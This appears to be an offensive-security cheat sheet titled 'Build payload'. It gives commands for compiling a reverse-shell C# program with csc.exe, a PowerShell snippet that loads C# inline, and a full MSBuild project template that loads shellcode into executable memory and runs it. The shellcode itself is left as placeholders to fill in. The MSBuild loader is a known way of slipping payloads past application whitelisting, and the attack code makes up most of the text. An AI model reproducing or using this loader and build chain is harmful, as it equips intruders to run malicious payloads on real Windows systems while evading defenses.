# Build payload

## Finding the C# compiler (csc.exe)

```bat
dir /s %WINDIR%\CSC.EXE| findstr "Directory"
```

Output:

```path
c:\windows\Microsoft.NET\Framework\v2.0.50727\csc.exe
c:\windows\Microsoft.NET\Framework\v3.5\csc.exe
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe
c:\windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe
c:\windows\Microsoft.NET\Framework64\v3.5\csc.exe
c:\windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
```

## Build for x32

```bat
%WINDIR%\Microsoft.Net\Framework64\v4.0.30319\csc.exe /t:exe /platform:x86 /out:ReverseShell.exe ReverseShell.cs 
```

## Build for x64

```bat
%WINDIR%\Microsoft.Net\Framework64\v4.0.30319\csc.exe /t:exe /platform:x64 /out:ReverseShell.exe ReverseShell.cs
```

## Run C# with powershell

Running MessageBox by loading it dynamically.

```powershell
$User32 = @"
using System;
using System.Runtime.InteropServices;
public class User32 { 
    [DllImport("user32.dll", SetLastError = true, CharSet=CharSet.Auto)]
    public static extern int MessageBox(int hwnd, String text, String caption, uint type);
}
"@
Add-Type $User32
[User32]::MessageBox(0,"Title","Hello World",0);
```

## Build with msbuild in csproj extension

### Run a shellcode

To execute the payload:

```bat
C:\Windows\microsoft.net\framework\v4.0.30319\msbuild.exe sc.csproj
```

Edit the payload: `sc.csproj`

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
    
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassExample :  Task, ITask
        {         
          private static UInt32 MEM_COMMIT = 0x1000;          
          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
          [DllImport("kernel32")]
            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
          [DllImport("kernel32")]
            private static extern IntPtr CreateThread(            
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId           
            );
          [DllImport("kernel32")]
            private static extern UInt32 WaitForSingleObject(           
            IntPtr hHandle,
            UInt32 dwMilliseconds
            );          
          public override bool Execute()
          {
            byte[] shellcode = new byte[SHELLCODE_SIZE] {            # <-- TO EDIT

              SHELLCODE_GEN                                          # <-- TO EDIT
              
              };
              UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
              IntPtr hThread = IntPtr.Zero;
              UInt32 threadId = 0;
              IntPtr pinfo = IntPtr.Zero;
              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
              WaitForSingleObject(hThread, 0xFFFFFFFF);
              return true;
          } 
        }     
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

## Source

- <https://www.youtube.com/watch?v=EwEwRLedeKI>
- <https://0xdf.gitlab.io/2022/04/25/htb-fighter.html>
- <https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20shellcode.xml>
